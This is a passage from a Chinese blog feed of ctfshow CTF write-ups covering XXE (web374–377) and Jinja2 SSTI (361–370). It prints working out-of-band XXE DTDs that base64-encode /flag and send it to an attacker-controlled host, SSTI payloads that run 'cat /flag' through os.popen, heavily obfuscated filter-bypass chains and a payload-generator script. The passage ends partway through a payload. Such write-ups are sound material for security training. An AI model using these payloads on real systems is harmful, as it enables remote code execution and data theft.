class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xx.xxx.78:8000/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd文件:</p><p>(flag必须base64这样编码才打得通,不知道是不是服务器的问题=.=)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;xxx.xx.xxx.78:8000&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><p>服务器端数据base64解码即可</p><p><img src="1610082443757.png" alt="1610082443757"></p><h2 id="web375-376"><a href="#web375-376" class="headerlink" title="web375 376"></a>web375 376</h2><p>存在过滤,用空格绕过即可</p><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xx.xxx.78:8000/test.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="1610082443757.png" alt="1610082443757"></p><h2 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h2><p>禁用了http,可以考虑别的协议,像ftp等</p><p>搭建ftp 服务 python -m pyftpdlib -p 8001 (打的时候把安全组关了)</p><p>开http服务监听 python3 -m http.server 8000</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;ftp:&#x2F;&#x2F;xxx.xx.xxx.78:8001&#x2F;test.dtd&quot;&gt; %xxe;]&gt;</span><br><span class="line">&lt;root&gt;&lt;ctfshow&gt;&amp;xxe;&lt;&#x2F;ctfshow&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;xxx.xx.xxx.78:8000&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><p><img src="1610090109891.png" alt="1610090109891"></p>]]></content>
      
      
      <categories>
          
          <category> CTFSHOW </category>
          
          <category> 安全 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web入门 SSTI WP</title>
      <link href="2021/01/07/SSTI/"/>
      <url>2021/01/07/SSTI/</url>
      
        <content type="html"><![CDATA[<h2 id="361-362"><a href="#361-362" class="headerlink" title="361 362"></a>361 362</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat /flag&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="363"><a href="#363" class="headerlink" title="363"></a>363</h2><p>过滤引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()&#125;&#125;&amp;os=os&amp;command=cat /flag</span><br></pre></td></tr></table></figure><h2 id="364"><a href="#364" class="headerlink" title="364"></a>364</h2><p>args又被过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[request.cookies.os].popen(request.cookies.command).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">cookie: os=os;command=cat /flag</span><br></pre></td></tr></table></figure><h2 id="365"><a href="#365" class="headerlink" title="365"></a>365</h2><p>[]被过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;config.__class__.__init__.__globals__.get(request.cookies.os).popen(request.cookies.command).read()&#125;&#125;</span><br><span class="line">cookie: os=os;command=cat /flag</span><br></pre></td></tr></table></figure><h2 id="366-367"><a href="#366-367" class="headerlink" title="366 367"></a>366 367</h2><p>_ 又被过滤</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">191</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">=&gt; </span><br><span class="line">&#123;&#123;()|attr(request.cookies.<span class="keyword">class</span>)|attr(request.cookies.base)|attr(request.cookies.subclasses)()|attr(request.cookies.getitem)(<span class="number">191</span>)|attr(request.cookies.init)|attr(request.cookies.<span class="built_in">globals</span>)|attr(request.cookies.getitem)(request.cookies.builtins)|attr(request.cookies.getitem)(request.cookies.<span class="built_in">eval</span>)(request.cookies.command)&#125;&#125;</span><br><span class="line">cookie: class=__class__;base=__base__;subclasses=__subclasses__;getitem=__getitem__;init=__init__;globals=__globals__;builtins=__builtins__;eval=eval;command=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></pre></td></tr></table></figure><p>191这个位置是用burp爆破出来的</p><h2 id="368"><a href="#368" class="headerlink" title="368"></a>368</h2>    {{被过滤   <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(()|attr(request.cookies.<span class="keyword">class</span>)|attr(request.cookies.base)|attr(request.cookies.subclasses)()|attr(request.cookies.getitem)(<span class="number">191</span>)|attr(request.cookies.init)|attr(request.cookies.<span class="built_in">globals</span>)|attr(request.cookies.getitem)(request.cookies.builtins)|attr(request.cookies.getitem)(request.cookies.<span class="built_in">eval</span>)(request.cookies.command))%&#125;</span><br><span class="line">cookie: class=__class__;base=__base__;subclasses=__subclasses__;getitem=__getitem__;init=__init__;globals=__globals__;builtins=__builtins__;eval=eval;command=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></pre></td></tr></table></figure><h2 id="369"><a href="#369" class="headerlink" title="369"></a>369</h2>   过滤有点多,过滤了: _ [] ' " {{ request args os   <p>参考y1ng师傅<a href="https://www.gem-love.com/ctf/2598.html%E8%BF%99%E4%B8%AA%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6%E7%9A%84%E6%8A%80%E5%B7%A7">https://www.gem-love.com/ctf/2598.html这个构造字符的技巧</a></p><blockquote><p>另一种思路是利用内置类找到chr</p></blockquote><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select()|string()|<span class="built_in">list</span>()).pop(<span class="number">24</span>)|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> do = <span class="built_in">dict</span>(do=ro,c=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> doc = xhx*<span class="number">2</span>~do~xhx*<span class="number">2</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> spa = ((app|attr(doc)|<span class="built_in">list</span>()).pop(<span class="number">102</span>)|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pt = ((app|attr(doc)|<span class="built_in">list</span>()).pop(<span class="number">320</span>)|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = ((app|attr(doc)|<span class="built_in">list</span>()).pop(<span class="number">337</span>)|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> left = ((app|attr(doc)|<span class="built_in">list</span>()).pop(<span class="number">264</span>)|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> right = ((app|attr(doc)|<span class="built_in">list</span>()).pop(<span class="number">286</span>)|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini = <span class="built_in">dict</span>(<span class="keyword">in</span>=ro,it=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> init = xhx*<span class="number">2</span>~ini~xhx*<span class="number">2</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glob = <span class="built_in">dict</span>(glo=ro,bals=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span> = xhx*<span class="number">2</span>~glob~xhx*<span class="number">2</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> rep = <span class="built_in">dict</span>(re=ro,pr=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">repr</span> = xhx*<span class="number">2</span>~rep~xhx*<span class="number">2</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> slas = (y1ng|attr(init)|attr(<span class="built_in">globals</span>)|attr(<span class="built_in">repr</span>)()|<span class="built_in">list</span>()).pop(<span class="number">349</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bu = <span class="built_in">dict</span>(buil=aa,tins=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> im = <span class="built_in">dict</span>(imp=aa,ort=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> sy = <span class="built_in">dict</span>(po=aa,pen=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ox = <span class="built_in">dict</span>(o=aa,s=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~bu~xhx*<span class="number">2</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pld = xhx*<span class="number">2</span>~im~xhx*<span class="number">2</span>~left~yin~ox~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %&#125; </span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> cla = <span class="built_in">dict</span>(cla=ro,ss=dd)|join()%&#125;</span><br><span class="line">&#123;% set class = xhx*2~cla~xhx*2%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ba = <span class="built_in">dict</span>(ba=ro,se=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> base = xhx*<span class="number">2</span>~ba~xhx*<span class="number">2</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subcla = <span class="built_in">dict</span>(subc=ro,lasses=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subclasses = xhx*<span class="number">2</span>~subcla~xhx*<span class="number">2</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getit = <span class="built_in">dict</span>(get=ro,item=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem = xhx*<span class="number">2</span>~getit~xhx*<span class="number">2</span>%&#125;</span><br><span class="line">&#123;%print(()|attr(<span class="class"><span class="keyword">class</span>)|<span class="title">attr</span>(<span class="params">base</span>)|<span class="title">attr</span>(<span class="params">subclasses</span>)()|<span class="title">attr</span>(<span class="params">getitem</span>)(<span class="params"><span class="number">191</span></span>)|<span class="title">attr</span>(<span class="params">init</span>)|<span class="title">attr</span>(<span class="params"><span class="built_in">globals</span></span>)|<span class="title">attr</span>(<span class="params">getitm</span>)(<span class="params">bul</span>)|<span class="title">attr</span>(<span class="params">getitem</span>)(<span class="params">ev</span>)(<span class="params">pld</span>))%&#125;</span></span><br></pre></td></tr></table></figure><h2 id="370"><a href="#370" class="headerlink" title="370"></a>370</h2><p>过滤加上数字.可以利用过滤器构造</p><p>写了个脚本来构造:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNum</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;zero&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;one&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;two&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;three&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;four&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;five&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;six&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;seven&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;eight&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nine&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        numBIn = <span class="built_in">bin</span>(x)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">        num = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        mi = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> numBIn:</span><br><span class="line">            num = num + getNum(<span class="built_in">int</span>(i)) + <span class="string">&#x27;*(&#x27;</span> + getNum(<span class="number">2</span>) + <span class="string">&#x27;**&#x27;</span> + getNum(mi) + <span class="string">&#x27;)+&#x27;</span></span><br><span class="line">            mi = mi + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;(&#x27;</span> + num[:-<span class="number">1</span>] + <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;%set one=(a,)|wordcount%&#125;&#123;%set zero=one-one%&#125;&#123;%set two=(a,a)|wordcount%&#125;&#123;%set three=(a,a,a)|wordcount%&#125;&#123;%set four=(a,a,a,a)|wordcount%&#125;&#123;%set five=(a,a,a,a,a)|wordcount%&#125;&#123;%set six=(a,a,a,a,a,a)|wordcount%&#125;&#123;%set seven=(a,a,a,a,a,a,a)|wordcount%&#125;&#123;%set eight=(a,a,a,a,a,a,a,a)|wordcount%&#125;&#123;%set nine=(a,a,a,a,a,a,a,a,a)|wordcount%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set xhx = ((&#123; &#125;|select()|string()|list()).pop(&#x27;</span> + getNum(<span class="number">24</span>) + <span class="string">&#x27;)|string())%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set do = dict(do=ro,c=dd)|join()%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set doc = xhx*two~do~xhx*two%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set spa = ((app|attr(doc)|list()).pop(&#x27;</span> + getNum(<span class="number">102</span>) + <span class="string">&#x27;)|string())%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set pt = ((app|attr(doc)|list()).pop(&#x27;</span> + getNum(<span class="number">320</span>) + <span class="string">&#x27;)|string())%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set yin = ((app|attr(doc)|list()).pop(&#x27;</span> + getNum(<span class="number">337</span>) + <span class="string">&#x27;)|string())%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set left = ((app|attr(doc)|list()).pop(&#x27;</span> + getNum(<span class="number">264</span>) + <span class="string">&#x27;)|string())%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set right = ((app|attr(doc)|list()).pop(&#x27;</span> + getNum(<span class="number">286</span>) + <span class="string">&#x27;)|string())%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set ini = dict(in=ro,it=dd)|join()%&#125;&#x27;</span> + <span class="string">&#x27;&#123;% set init = xhx*two~ini~xhx*two%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set glob = dict(glo=ro,bals=dd)|join()%&#125;&#x27;</span> + <span class="string">&#x27;&#123;% set globals = xhx*two~glob~xhx*two%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set rep = dict(re=ro,pr=dd)|join()%&#125;&#123;% set repr = xhx*two~rep~xhx*two%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set slas = (x|attr(init)|attr(globals)|attr(repr)()|list()).pop(&#x27;</span> + getNum(<span class="number">349</span>) + <span class="string">&#x27;)%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set bu = dict(buil=aa,tins=dd)|join() %&#125;&#123;% set im = dict(imp=aa,ort=dd)|join() %&#125;&#123;% set sy = dict(po=aa,pen=dd)|join() %&#125;&#123;% set ox = dict(o=aa,s=dd)|join() %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join() %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join() %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join() %&#125;&#123;% set red = dict(re=aa,ad=dd)|join()%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set bul = xhx*two~bu~xhx*two %&#125;&#x27;</span> + <span class="string">&#x27;&#123;% set pld = xhx*two~im~xhx*two~left~yin~ox~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %&#125; &#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;% set cla = dict(cla=ro,ss=dd)|join()%&#125;&#123;% set class = xhx*two~cla~xhx*two%&#125;&#123;% set ba = dict(ba=ro,se=dd)|join()%&#125;&#123;% set base = xhx*two~ba~xhx*two%&#125;&#123;% set subcla = dict(subc=ro,lasses=dd)|join()%&#125;&#123;% set subclasses = xhx*two~subcla~xhx*two%&#125;&#123;% set getit = dict(get=ro,item=dd)|join()%&#125;&#123;% set getitem = xhx*two~getit~xhx*two%&#125;&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;&#123;%print(()|attr(class)|attr(base)|attr(subclasses)()|attr(getitem)(&#x27;</span> + getNum(</span><br><span class="line">    <span class="number">191</span>) + <span class="string">&#x27;)|attr(init)|attr(globals)|attr(getitem)(bul)|attr(getitem)(ev)(pld))%&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%2b&#x27;</span>)</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20one=(a,)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20zero=one-one%&#125;&#123;%<span class="built_in">set</span>%20two=(a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20three=(a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20four=(a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20five=(a,a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20six=(a,a,a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20seven=(a,a,a,a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20eight=(a,a,a,a,a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20nine=(a,a,a,a,a,a,a,a,a)|wordcount%&#125;</span><br><span class="line">&#123;%%20set%20xhx%<span class="number">20</span>=%<span class="number">20</span>((&#123;%<span class="number">20</span>&#125;|select()|string()|<span class="built_in">list</span>()).pop((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bone*(two**four)))|string())%&#125;&#123;%%20set%20do%<span class="number">20</span>=%20dict(do=ro,c=dd)|join()%&#125;&#123;%%20set%20doc%<span class="number">20</span>=%20xhx*two~do~xhx*two%&#125;&#123;%%20set%20spa%<span class="number">20</span>=%<span class="number">20</span>((app|attr(doc)|<span class="built_in">list</span>()).pop((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))|string())%&#125;&#123;%%20set%20pt%<span class="number">20</span>=%<span class="number">20</span>((app|attr(doc)|<span class="built_in">list</span>()).pop((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bzero*(two**five)%2bone*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))|string())%&#125;&#123;%%20set%20yin%<span class="number">20</span>=%<span class="number">20</span>((app|attr(doc)|<span class="built_in">list</span>()).pop((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))|string())%&#125;&#123;%%20set%20left%<span class="number">20</span>=%<span class="number">20</span>((app|attr(doc)|<span class="built_in">list</span>()).pop((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bzero*(two**five)%2bzero*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))|string())%&#125;&#123;%%20set%20right%<span class="number">20</span>=%<span class="number">20</span>((app|attr(doc)|<span class="built_in">list</span>()).pop((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bzero*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))|string())%&#125;&#123;%%20set%20ini%<span class="number">20</span>=%20dict(<span class="keyword">in</span>=ro,it=dd)|join()%&#125;&#123;%%20set%20init%<span class="number">20</span>=%20xhx*two~ini~xhx*two%&#125;&#123;%%20set%20glob%<span class="number">20</span>=%20dict(glo=ro,bals=dd)|join()%&#125;&#123;%%20set%20globals%<span class="number">20</span>=%20xhx*two~glob~xhx*two%&#125;&#123;%%20set%20rep%<span class="number">20</span>=%20dict(re=ro,pr=dd)|join()%&#125;&#123;%%20set%20repr%<span class="number">20</span>=%20xhx*two~rep~xhx*two%&#125;&#123;%%20set%20slas%<span class="number">20</span>=%<span class="number">20</span>(x|attr(init)|attr(<span class="built_in">globals</span>)|attr(<span class="built_in">repr</span>)()|<span class="built_in">list</span>()).pop((one*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))%&#125;&#123;%%20set%20bu%<span class="number">20</span>=%20dict(buil=aa,tins=dd)|join()%<span class="number">20</span>%&#125;&#123;%%20set%20im%<span class="number">20</span>=%20dict(imp=aa,ort=dd)|join()%<span class="number">20</span>%&#125;&#123;%%20set%20sy%<span class="number">20</span>=%20dict(po=aa,pen=dd)|join()%<span class="number">20</span>%&#125;&#123;%%20set%20ox%<span class="number">20</span>=%20dict(o=aa,s=dd)|join()%<span class="number">20</span>%&#125;&#123;%%20set%20ca%<span class="number">20</span>=%20dict(ca=aa,t=dd)|join()%<span class="number">20</span>%&#125;&#123;%%20set%20flg%<span class="number">20</span>=%20dict(fl=aa,ag=dd)|join()%<span class="number">20</span>%&#125;&#123;%%20set%20ev%<span class="number">20</span>=%20dict(ev=aa,al=dd)|join()%<span class="number">20</span>%&#125;&#123;%%20set%20red%<span class="number">20</span>=%20dict(re=aa,ad=dd)|join()%&#125;&#123;%%20set%20bul%<span class="number">20</span>=%20xhx*two~bu~xhx*two%<span class="number">20</span>%&#125;&#123;%%20set%20pld%<span class="number">20</span>=%20xhx*two~im~xhx*two~left~yin~ox~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%<span class="number">20</span>%&#125;%<span class="number">20</span>&#123;%%20set%20cla%<span 